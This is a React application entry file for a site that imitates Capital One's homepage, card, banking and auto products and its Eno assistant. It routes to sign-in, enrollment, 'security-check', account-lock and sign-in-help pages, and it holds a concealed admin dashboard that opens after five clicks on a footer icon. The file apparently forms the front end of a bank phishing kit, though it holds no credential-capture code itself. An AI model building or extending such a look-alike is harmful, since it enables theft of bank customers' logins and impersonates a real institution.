import React, { useState, useEffect } from 'react';
import { AdminStoreProvider } from './store/AdminStore';
import { QueryClientProvider } from '@tanstack/react-query';
import { queryClient } from './store/queryClient';
import { MobileHeader } from './components/MobileHeader';
import { HeroSection } from './components/HeroSection';
import { ChooseTopicSection } from './components/ChooseTopicSection';
import { FeatureFunnelRows } from './components/FeatureFunnelRows';
import { FullWidthBanner } from './components/FullWidthBanner';
import { BuiltInBenefitsSection } from './components/BuiltInBenefitsSection';
import { BusinessFinanceSection } from './components/BusinessFinanceSection';
import { DigitalToolsCarousel } from './components/DigitalToolsCarousel';
import { MoreThanABankSection } from './components/MoreThanABankSection';
import { ProductNavTiles } from './components/ProductNavTiles';
import { CreditCardsShowcase } from './components/CreditCardsShowcase';
import { PreApprovalSimulator } from './components/PreApprovalSimulator';
import { BankingSection } from './components/BankingSection';
import { AutoNavigatorSection } from './components/AutoNavigatorSection';
import { CreditWiseSection } from './components/CreditWiseSection';
import { ReferAFriendSection } from './components/ReferAFriendSection';
import { ChatWithEno } from './components/ChatWithEno';
import { GlobalFooter } from './components/GlobalFooter';
import { FloatingMegaphone } from './components/FloatingMegaphone';
import { SlideNavDrawer } from './components/SlideNavDrawer';
import { SignInModal } from './components/SignInModal';
import { AdminPasscodeModal } from './components/AdminPasscodeModal';

// Dedicated simulation routes
import { InterstitialPage } from './pages/InterstitialPage';
import { SignInPage } from './pages/SignInPage';
import { EnrollPage } from './pages/EnrollPage';
import { AccountLockPage } from './pages/AccountLockPage';
import { SignInHelpPage } from './pages/SignInHelpPage';
import { AdminDashboardPage } from './pages/AdminDashboardPage';
import { UserBankingDashboard } from './pages/UserBankingDashboard';
import { ProfilePage } from './pages/ProfilePage';

import { CheckCircle2, X } from 'lucide-react';

function AppContent() {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isSignInOpen, setIsSignInOpen] = useState(false);
  const [isPreApprovalOpen, setIsPreApprovalOpen] = useState(false);
  const [isAdminPasscodeOpen, setIsAdminPasscodeOpen] = useState(false);
  const [activeSection, setActiveSection] = useState('cards');

  // Route state
  const [currentPath, setCurrentPath] = useState<string>(() => {
    if (typeof window !== 'undefined') {
      const hash = window.location.hash.slice(1);
      if (hash && hash.startsWith('/')) {
        return hash;
      }
    }
    return '/';
  });

  // Sync hash changes
  useEffect(() => {
    const handleHashChange = () => {
      const hash = window.location.hash.slice(1);
      if (hash && hash.startsWith('/')) {
        setCurrentPath(hash);
      } else if (!hash) {
        setCurrentPath('/');
      }
    };
    window.addEventListener('hashchange', handleHashChange);
    return () => window.removeEventListener('hashchange', handleHashChange);
  }, []);

  const navigate = (path: string) => {
    setCurrentPath(path);
    window.location.hash = path;
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  // Accessibility States
  const [fontSizeLevel, setFontSizeLevel] = useState<'normal' | 'large' | 'xlarge'>('normal');
  const [isHighContrast, setIsHighContrast] = useState(false);

  // Global Toast Feedback State
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  const showToast = (message: string) => {
    setToastMessage(message);
    setTimeout(() => {
      setToastMessage(null);
    }, 3500);
  };

  const resolveSectionId = (sectionId: string) => {
    const sectionMap: Record<string, string> = {
      business: 'business-solutions',
      commercial: 'business-solutions',
      'business-solutions': 'business-solutions',
    };
    return sectionMap[sectionId] || sectionId;
  };

  const handleNavigateSection = (sectionId: string) => {
    const resolvedSectionId = resolveSectionId(sectionId);
    if (currentPath !== '/') {
      navigate('/');
      setTimeout(() => {
        const element = document.getElementById(resolvedSectionId);
        if (element) element.scrollIntoView({ behavior: 'smooth' });
      }, 100);
      return;
    }
    setActiveSection(resolvedSectionId);
    const element = document.getElementById(resolvedSectionId);
    if (element) element.scrollIntoView({ behavior: 'smooth' });
  };

  const handleShopCards = () => {
    handleNavigateSection('cards');
    showToast('Viewing Capital One credit card offerings');
  };

  const handleApplyCard = (cardName: string) => {
    showToast(`Application started for ${cardName}. Your pre-filled form is ready.`);
  };

  const handleOpenAccount = (accountType: string) => {
    showToast(`Opening digital application for Capital One ${accountType}`);
  };

  const handlePreQualifyAuto = () => {
    showToast('Auto Navigator pre-qualification started. Finding vehicles near you.');
  };

  const handleCreditWiseSignUp = () => {
    showToast('CreditWise registration initialized. 100% free with no score impact.');
  };

  // Route rendering helper
  const renderRouteContent = () => {
    switch (currentPath) {
      case '/interstitial':
        return <InterstitialPage onNavigate={navigate} />;
      case '/signin':
      case '/login':
        return <SignInPage onNavigate={navigate} />;
      case '/enroll':
        return <EnrollPage onNavigate={navigate} isSecurityCheck={false} />;
      case '/enroll/security-check':
        return <EnrollPage onNavigate={navigate} isSecurityCheck={true} />;
      case '/enroll/account-lock':
        return <AccountLockPage onNavigate={navigate} />;
      case '/sign-in-help':
        return <SignInHelpPage onNavigate={navigate} />;
      case '/dashboard':
        return <UserBankingDashboard onNavigate={navigate} />;
      case '/profile':
        return <ProfilePage onNavigate={navigate} />;
      case '/admin':
        return <AdminDashboardPage onNavigate={navigate} />;
      case '/':
      default:
        return (
          <>
            {/* Component 1: Mobile Header (Sticky top header, white background, hamburger, logo, sign in) */}
            <MobileHeader
              onOpenMenu={() => setIsMenuOpen(true)}
              onOpenSignIn={() => navigate('/signin')}
              onNavigateSection={handleNavigateSection}
            />

            <main>
              {/* Component 2: The Hero Section (Autumn rolling mountains 40vh, overlapping card, shop cards CTA) */}
              <HeroSection
                onShopCards={handleShopCards}
                onPreApproval={() => setIsPreApprovalOpen(true)}
              />

              {/* Component 3: Choose a Topic */}
              <ChooseTopicSection
                onSelectTopic={(topicId) => {
                  const label = topicId === 'meet' ? 'Meet Capital One' : topicId === 'wellness' ? 'Financial Wellness' : 'Built-in Benefits';
                  showToast(`Selected topic: ${label}`);
                }}
              />

              {/* Component 4: Feature Funnel Rows (Find Card, Bank, Auto) */}
              <FeatureFunnelRows
                onCheckEligibility={() => {
                  setIsPreApprovalOpen(true);
                  showToast('Checking card eligibility with no credit impact');
                }}
                onExploreBanking={() => {
                  handleNavigateSection('banking');
                  showToast('Exploring 360 Checking and High Yield Savings');
                }}
                onStartAutoShopping={() => {
                  handleNavigateSection('auto');
                  showToast('Starting Auto Navigator vehicle search');
                }}
              />

              {/* Component 5: Full-Width Image Banner */}
              <FullWidthBanner
                onExploreAllCards={() => {
                  handleNavigateSection('cards');
                  showToast('Browsing full Capital One card portfolio');
                }}
              />

              {/* Component 6: More Built-in Benefits (Text block) */}
              <BuiltInBenefitsSection
                onCompareCards={() => {
                  handleNavigateSection('cards');
                  showToast('Comparing Capital One credit cards');
                }}
              />

              {/* Component 7: Business Finance Section */}
              <BusinessFinanceSection
                onExploreBusiness={() => {
                  handleNavigateSection('business-solutions');
                  showToast('Exploring Capital One Spark Business Solutions');
                }}
              />

              {/* Component 8: Digital Tools (The Phone Mockup Carousel) */}
              <DigitalToolsCarousel
                onExploreMoreTools={() => {
                  handleNavigateSection('creditwise');
                  showToast('Exploring mobile digital tools and Eno security');
                }}
                onOpenSignIn={() => navigate('/signin')}
              />

              {/* Product Quick-Access Nav Grid */}
              <ProductNavTiles
                activeSection={activeSection}
                onSelectProduct={handleNavigateSection}
              />

              {/* Capital One Credit Cards Showcase & Soft-Pull Banner */}
              <CreditCardsShowcase
                onPreApproval={() => setIsPreApprovalOpen(true)}
                onApplyCard={handleApplyCard}
              />

              {/* 360 Checking & Performance Savings with Interactive Calculator */}
              <BankingSection onOpenAccount={handleOpenAccount} />

              {/* Capital One Auto Navigator Section with Live Payment Estimator */}
              <AutoNavigatorSection onPreQualify={handlePreQualifyAuto} />

              {/* CreditWise Free Monitoring with Live Credit Simulator */}
              <CreditWiseSection onSignUp={handleCreditWiseSignUp} />

              {/* Refer-a-Friend Section with Reward Tiers and Email Form */}
              <ReferAFriendSection
                onApplyProduct={handleApplyCard}
                showToast={showToast}
              />

              {/* Component 9: We're More Than a Bank (Card Stack) */}
              <MoreThanABankSection
                onLearnMore={(cardId) => {
                  const label = cardId === 'shopping' ? 'Capital One Shopping' : cardId === 'cafe' ? 'Capital One Cafés' : 'Capital One Travel';
                  showToast(`Viewing details for ${label}`);
                }}
              />
            </main>

            {/* Component 10: The Global Footer (Dark Mode with Accordions & Legal Bar) */}
            <GlobalFooter onOpenAdminPasscode={() => setIsAdminPasscodeOpen(true)} />

            {/* Global Floating Accessibility Megaphone (Fixed bottom right) */}
            <FloatingMegaphone
              fontSizeLevel={fontSizeLevel}
              onChangeFontSize={setFontSizeLevel}
              isHighContrast={isHighContrast}
              onToggleHighContrast={() => setIsHighContrast(!isHighContrast)}
            />
          </>
        );
    }
  };

  return (
    <div className={`min-h-screen flex flex-col ${isHighContrast ? 'contrast-125' : ''}`}>
      <main className="flex-1 w-full">
        {renderRouteContent()}
      </main>

      {/* Slide-Out Navigation Drawer */}
      <SlideNavDrawer
        isOpen={isMenuOpen}
        onClose={() => setIsMenuOpen(false)}
        onOpenSignIn={() => {
          setIsMenuOpen(false);
          navigate('/signin');
        }}
        onNavigateSection={handleNavigateSection}
      />

      {/* Capital One Online Banking Sign-In Modal */}
      <SignInModal
        isOpen={isSignInOpen}
        onClose={() => setIsSignInOpen(false)}
        onNavigate={navigate}
      />

      {/* Pre-Approval Soft Credit Check Simulator */}
      <PreApprovalSimulator
        isOpen={isPreApprovalOpen}
        onClose={() => setIsPreApprovalOpen(false)}
        onSelectMatchedCard={(cardName) => {
          showToast(`Pre-approval match saved for ${cardName}`);
          handleApplyCard(cardName);
        }}
      />

      {/* Admin Passcode Modal (Triggered by 5 clicks on Google Icon in Footer) */}
      <AdminPasscodeModal
        isOpen={isAdminPasscodeOpen}
        onClose={() => setIsAdminPasscodeOpen(false)}
        onSuccess={() => navigate('/admin')}
      />

      {/* Floating 'Chat with Eno' Virtual Assistant Widget */}
      <ChatWithEno
        onNavigate={navigate}
        onOpenPreApproval={() => setIsPreApprovalOpen(true)}
      />

      {/* Global Toast Notification */}
      {toastMessage && (
        <div className="fixed bottom-6 left-1/2 -translate-x-1/2 z-50 bg-slate-900 text-white px-4 py-2.5 rounded-full shadow-2xl border border-slate-700 text-xs font-semibold flex items-center gap-2 animate-in fade-in slide-in-from-bottom-3 duration-200">
          <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
          <span>{toastMessage}</span>
          <button
            type="button"
            onClick={() => setToastMessage(null)}
            className="ml-2 text-slate-400 hover:text-white"
          >
            <X className="w-3.5 h-3.5" />
          </button>
        </div>
      )}
    </div>
  );
}

export default function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <AdminStoreProvider>
        <AppContent />
      </AdminStoreProvider>
    </QueryClientProvider>
  );
}
